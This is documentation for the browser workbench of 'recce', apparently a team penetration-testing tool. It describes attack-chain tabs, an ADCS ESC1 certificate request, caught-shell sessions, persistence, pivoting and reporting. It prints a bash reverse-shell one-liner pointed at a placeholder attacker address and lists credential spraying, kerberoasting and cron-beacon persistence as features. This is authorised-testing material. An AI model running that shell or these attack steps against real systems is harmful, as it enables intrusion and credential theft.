# Web workbench (`recce serve`)

`recce serve -o eng` hosts the whole engagement as a shared browser UI.
Multiple testers open the same URL and see the same live state —
findings, scans, credentials, sessions, attack chains, and the report.
This doc walks the tabs a tester actually uses.

> Part of the [recce reference](../README.md) · back to the [project README](../../README.md).

## Start it

```bash
recce serve -o eng --port 8443
```

Open `http://<box>:8443`. `--host 0.0.0.0` for team access.

No auth by default — put a reverse proxy in front (nginx / caddy) if
the engagement network isn't already trusted. TLS: use the reverse
proxy or generate a cert into `<eng>/webui-cert.pem` and set
`RECCE_WEBUI_CERT=<path>`.

## Tabs

Eleven top-level tabs, some with sub-tabs. Every tab reflects the
same underlying store — writes from one propagate to the others via
SSE.

| Tab | What it's for |
|---|---|
| **Dashboard** | Overview: hosts up, findings by severity, KEV shortlist, top-risk hosts |
| **Scan** | Two-pane workbench — pick a command, edit targets, launch. Live output drawer. Every CLI scan is available here. |
| **Data** | Sub-tabs: **Hosts** (per-host with drilldown), **Services** (port × service pivot), **Assets** (unions — hostnames, domains, cleartext creds, OT assets) |
| **Findings** | Filter/triage vulnerabilities. Status: new/triaged/confirmed/in-report/excluded/retested. Notes, dismiss, add-to-report. Per-finding write-up download. |
| **Attack** | Sub-tabs: **Surface** (proven-exploitable), **Suggest** (ranked next moves + chain rules), **AD**, **Cloud**, **Web** (attack chains) |
| **Plan** | Sub-tabs: **Actions** (ranked action cards), **Phases** (recon → enum → vuln narrative) |
| **Topology** | Network map. Nodes coloured by role; edges from ingested topology data. |
| **Sessions** | Caught shells — attach in-browser, per-host grouping, quick-actions, upgrade to PTY, tunnels/port-forwards |
| **Timeline** | What happened when — every mutation logged for the report |
| **Creds** | Captured credentials. Scope column (🏠 local / 🌐 domain). Spray + paste-to-loot + one-liner copy |
| **Report** | Generate + download the client-ready HTML / Excel / DOCX |

### Sidebar (right)

Team-facing quick-reference strip:

- **▌ Status** — what's scanning now (per-job progress bars) + your review queue + team coverage
- **👤 Assign** — claim hosts, see who owns what
- **⚡ Activity** — live feed of every mutation across all testers
- **🔑 Creds** — compact summary strip: scope split (local vs each domain), admin-count chip, latest capture, top sources, paste-to-loot
- **💬 Chat** — team chat + image drops (persisted in `<eng>/chat-media/`)

### Header

- **Engagement badge** — current engagement name; dropdown of peer engagements in the same parent dir
- **Autocrack pill** — hashcat cracks the watcher has folded back as new creds (see [active-directory.md](active-directory.md))
- **Jobs pill** — number of scans running, with aggregate progress bar (only visible when jobs are up)
- **Proxy badge** — SOCKS pivot state (visible when a session tunnel is up)

## Attack chains (Attack tab)

Three chains, all read from the same finding store:

- **AD chain** — discover_dc → null_session → anon_ldap_read → user_enum
  → unauth_roast → cred_acquired → coercion_reachable → authed_kerberoast
  → lsa_or_ntds_dump → **adcs_esc** → da_path
- **Cloud chain** — imds_reachable → imds_v1_present → iam_role_disclosed
  → sts_creds_extracted → s3_buckets_listed → secrets_manager_read
- **Web chain** — web_surface_fingerprinted → product+version_pinned
  → kev_matched → poc_safe_verify_fires → oob_callback_triggered
  → session_established

Each step shows status (**proven** ✓ / pending / blocked), contributing
hosts (click through to HostDrawer), the evidence rows it consumed,
and a paste-ready next-step command. A DAG panel above the timeline
shows the depends-on graph — click a node to jump to its step.

### ADCS ESC1 auto-request (AD chain)

When the AD chain's `adcs_esc` step is **proven** (recce imported a
Certipy JSON showing an ESC1-vulnerable template), the step card
grows an **🎯 Attempt ESC1 request (intrusive)** button. Clicking:

1. Fetches the current gating state (is certipy installed? which
   store credentials can enroll?).
2. Opens a modal — pick a credential (AD principal + password/hash),
   fill in template / CA / DC IP / target UPN (usually
   `administrator@<domain>`).
3. Requires an explicit "🎯 Run certipy req (intrusive)" click; the
   modal sends the exact `confirm_sentinel` string the endpoint
   requires. A stale/replayed request can never fire.
4. On success: PFX is written to `<eng>/session-loot/adcs/`, a new
   `Credential(kind="cert")` is folded into the store, and the AD
   chain's `da_path` step advances on the next fetch.

recce **never** accepts a typed password in this modal — the
credential material comes from the store (spray, credenum, or the
AD chain's `cred_acquired` step captured it). The whole flow leaves
an audit trail in the collab activity feed.

## Sessions tab

Caught shells and everything you can do with them.

### Catching a shell

Start a listener (button on the Sessions tab, or `POST /api/listeners`),
then point any reverse shell at your box:

```bash
# From the target:
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
```

Fresh sessions get an adjective+animal name (STORMY_BEAR, CRISP_OTTER)
so team chat doesn't require typing UUIDs.

### Per-session capabilities

- **Attach** — in-browser xterm, driven by one tester at a time; others
  watch (presence badges show who's attached)
- **Quick actions** — 10 pre-baked recon commands (whoami, id,
  hostname, uname, sudo, pwd, os, ifconfig, ps, netstat), one click
- **Quickrun** — one-shot arbitrary command, output captured
- **Upgrade to PTY** — auto-pivot pushes a reconnecting-PTY stager
  into a raw shell; the upgraded session lands as a sibling
- **Enum** — runs `recce/local/recce-enum.sh` on the target, folds
  the output back into the engagement (findings + priv-esc + creds)
- **Upload/Download** — chunked base64 through the shell; uploads
  tracked in the teardown table
- **Task** — programmatic `run_and_capture` for external tools (this
  is the seam fieldkit's `recce-session` transport rides on)
- **Persist** — installs a cron beacon (INTRUSIVE, tracked and
  removable via the Teardown panel)
- **Tunnel** — reverse SOCKS5 through the session — proxychains-
  friendly. Header shows a Proxy badge while active.
- **Port-forward** — TCP forward on the target to any internal
  address; useful for impacket tools that don't honor SOCKS
- **Pivot plan** — given a target IP, prints SOCKS5-friendly commands
  (nmap/curl/ldapsearch/msf) plus per-port impacket recipes with the
  recommended port-forward config already computed
- **BloodHound** — kicks off `bloodhound-python` against a DC through
  the session's network vantage; results auto-ingest
- **Cred (loot)** — record a captured credential inline, auto-attributed
  to the session's host

## Sessions tab safety

- Every intrusive action logs to the collab activity feed with the
  operator's identity (X-Tester header)
- Uploads + persistence are tracked in the **Teardown** panel;
  end-of-engagement one-click reversal for everything recce dropped
- Cancel any running scan job from the CollabSidebar's "Scanning now"
  card

## Scan tab

Two-pane workbench:

- **Command picker** on the left — every CLI scan (enum, vulns, sweep,
  credsweep, plus every per-service command: smb, ftp, mongodb, mssql,
  postgres, opcua, s7, bacnet, dnp3, ...) with the field/flag catalog
- **Launch pane** on the right — pre-populated with sensible defaults
  for the picked command; targets field carries a live count of which
  discovered hosts qualify (from each module's own `<cmd>_targets`
  predicate)
- **Suggestions** — cross-service chain rules fire when the store has
  the right combination of findings. Examples: LDAP anon-read + AS-REP
  roastable users → "run kerbrute then GetNPUsers"; null-session +
  writable share → "drop SCF for coerce → relay chain"; SSRF-reachable
  IMDS + web foothold → "pivot through the metadata endpoint".
  18 rules ship out of the box; suggestions carry paste-ready command
  chains with rationale.
- **Live output** — floating drawer pinned to the viewport bottom.
  Long scans (nuclei / snmp / sweep / vulns) show per-host progress
  parsed from stdout.
- **Async scans** — spray and act/run don't block the request; they
  return a job id and stream progress via `/api/jobs/{id}/events`.

## Report tab

Generate the client-ready deliverables directly from the browser:

- **HTML report** — self-contained (findings, exec summary, attack
  path, host inventory, screenshots)
- **Excel workbook** — the full tracking sheet (Checklist, Services,
  Vulnerabilities, per-service tabs)
- **DOCX write-ups** — one Word doc per finding, or a combined report
  with severity summary table

The report includes only findings the operator has triaged into
**in-report** status — the Findings tab's status dropdown drives what
lands in the deliverable.

## Working airgap

`recce serve` is stdlib + FastAPI + Uvicorn. All frontend assets are
built into `recce/webui/static/` — no CDN calls, no external fetches.
On the operator's box just:

```bash
python3 -m recce serve -o eng --port 8443
```

If FastAPI isn't installed, use the **airgap bundle** (see
[packaging.md](packaging.md)) — it freezes everything into one folder.
